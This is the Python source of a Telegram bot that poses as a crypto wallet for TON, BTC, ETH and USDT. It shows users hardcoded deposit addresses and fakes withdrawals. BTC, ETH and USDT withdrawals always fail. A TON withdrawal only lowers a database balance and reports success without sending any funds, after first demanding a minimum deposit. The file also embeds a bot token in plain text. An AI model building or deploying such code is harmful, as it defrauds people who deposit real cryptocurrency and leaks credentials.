import asyncio
import logging
import aiohttp
import aiosqlite
from aiogram import Bot, Dispatcher, types
from aiogram.enums import ParseMode
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.filters import Text

BOT_TOKEN = "7988757416:AAE6ApzjE7WvMRxKp3W5ZpH8rsyrrfv71Yg"
ADMIN_ID = 7988595664
TON_DEPOSIT_ADDRESS = "UQDbWG-rt9WPhx_lWhlUYSezvBcXDvGiyagj72rnTGocUHwj"
MIN_WITHDRAW_TON = 5
DB_PATH = "users.db"  # Shared with main bot for linking balances

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, parse_mode=ParseMode.HTML)
dp = Dispatcher()

coin_info = {
    "TON": {"emoji": "💎", "image": "https://cryptologos.cc/logos/toncoin-ton-logo.png", "id": "the-open-network", "deposit": TON_DEPOSIT_ADDRESS},
    "BTC": {"emoji": "₿", "image": "https://cryptologos.cc/logos/bitcoin-btc-logo.png", "id": "bitcoin", "deposit": "bc1qfcgp3a7uamnyyc4j79x6n5lej7q2zn4zgvlsml"},
    "ETH": {"emoji": "Ξ", "image": "https://cryptologos.cc/logos/ethereum-eth-logo.png", "id": "ethereum", "deposit": "0x546E7e50fD96Afd4dAA4b25Ffa9910dcA1dE9d02"},
    "USDT": {"emoji": "💵", "image": "https://cryptologos.cc/logos/tether-usdt-logo.png", "id": "tether", "deposit": "0x546E7e50fD96Afd4dAA4b25Ffa9910dcA1dE9d02"}
}

main_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="💎 TON"), KeyboardButton(text="₿ BTC")],
        [KeyboardButton(text="Ξ ETH"), KeyboardButton(text="💵 USDT")],
        [KeyboardButton(text="ℹ️ Help")]
    ],
    resize_keyboard=True
)

withdraw_requests = {}

async def get_prices():
    ids = ",".join([coin_info[c]["id"] for c in coin_info])
    url = f"https://api.coingecko.com/api/v3/simple/price?ids={ids}&vs_currencies=usd"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            return await resp.json()

async def get_user_balance(user_id):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, balance REAL DEFAULT 0, deposited REAL DEFAULT 0)")
        cursor = await db.execute("SELECT balance, deposited FROM users WHERE user_id = ?", (user_id,))
        result = await cursor.fetchone()
        if result:
            return result
        else:
            await db.execute("INSERT INTO users (user_id, balance, deposited) VALUES (?, 0, 0)", (user_id,))
            await db.commit()
            return (0.0, 0.0)

async def update_user_balance(user_id, new_balance, new_deposit=None):
    async with aiosqlite.connect(DB_PATH) as db:
        if new_deposit is not None:
            await db.execute("UPDATE users SET balance = ?, deposited = ? WHERE user_id = ?", (new_balance, new_deposit, user_id))
        else:
            await db.execute("UPDATE users SET balance = ? WHERE user_id = ?", (new_balance, user_id))
        await db.commit()

@dp.message()
async def handle_message(message: types.Message):
    text = message.text.strip()
    user_id = message.from_user.id

    if text == "ℹ️ Help":
        await message.answer("Having issues?\nContact admin.\nState your problem and I will assist.")
        withdraw_requests[user_id] = "help"
        return

    if withdraw_requests.get(user_id) == "help":
        await bot.send_message(ADMIN_ID, f"User {user_id} sent a help request:\n{text}")
        await message.answer("Your issue has been forwarded to the admin. Please wait for a response.")
        del withdraw_requests[user_id]
        return

    stripped_text = text.replace("💎","").replace("₿","").replace("Ξ","").replace("💵","").strip().upper()
    if stripped_text in coin_info:
        data = await get_prices()
        balance, deposited = await get_user_balance(user_id) if stripped_text == "TON" else (0.0, 0.0)
        price = data.get(coin_info[stripped_text]["id"], {}).get("usd", 0)
        usd_value = balance * price
        caption = f"{coin_info[stripped_text]['emoji']} <b>{stripped_text} Wallet</b>\nBalance: {balance:.4f} {stripped_text}\nMarket Value: ${usd_value:.2f}"
        coin_keyboard = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="Deposit"), KeyboardButton(text="Withdraw")],[KeyboardButton(text="Back")]],
            resize_keyboard=True
        )
        withdraw_requests[user_id] = stripped_text
        await bot.send_photo(message.chat.id, coin_info[stripped_text]["image"], caption=caption, reply_markup=coin_keyboard)

    elif text.lower() == "deposit":
        coin = withdraw_requests.get(user_id)
        if coin and coin in coin_info:
            await message.answer(f"Deposit address for {coin}:\n<code>{coin_info[coin]['deposit']}</code>", parse_mode=ParseMode.HTML)
        else:
            await message.answer("Please select a coin first.", reply_markup=main_keyboard)

    elif text.lower() == "withdraw":
        coin = withdraw_requests.get(user_id)
        if not coin or coin not in coin_info:
            await message.answer("Please select a coin first.", reply_markup=main_keyboard)
            return
        if coin != "TON":
            await message.answer("Withdrawal unsuccessful, please try again later.")
            return

        balance, deposited = await get_user_balance(user_id)
        if deposited < MIN_WITHDRAW_TON:
            await message.answer(f"❌ You must have a minimum deposit of {MIN_WITHDRAW_TON} TON to withdraw.")
        else:
            withdraw_requests[user_id] = "withdraw_amount"
            await message.answer("How many TON do you want to withdraw?")

    elif withdraw_requests.get(user_id) == "withdraw_amount":
        try:
            amount = float(text)
            balance, deposited = await get_user_balance(user_id)
            if amount > balance:
                await message.answer(f"❌ Insufficient TON balance. You have {balance:.2f} TON.")
            else:
                new_balance = balance - amount
                await update_user_balance(user_id, new_balance, deposited)
                await message.answer("✅ Withdrawal successful! Confirmation will arrive within 24 hours.")
                await bot.send_message(ADMIN_ID, f"User {user_id} withdrew {amount:.4f} TON. New balance: {new_balance:.4f} TON.")
            withdraw_requests.pop(user_id, None)
        except ValueError:
            await message.answer("Please enter a valid number.")
    elif text.lower() == "back":
        await message.answer("Choose a coin:", reply_markup=main_keyboard)
    else:
        await message.answer("Use the menu buttons.", reply_markup=main_keyboard)

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
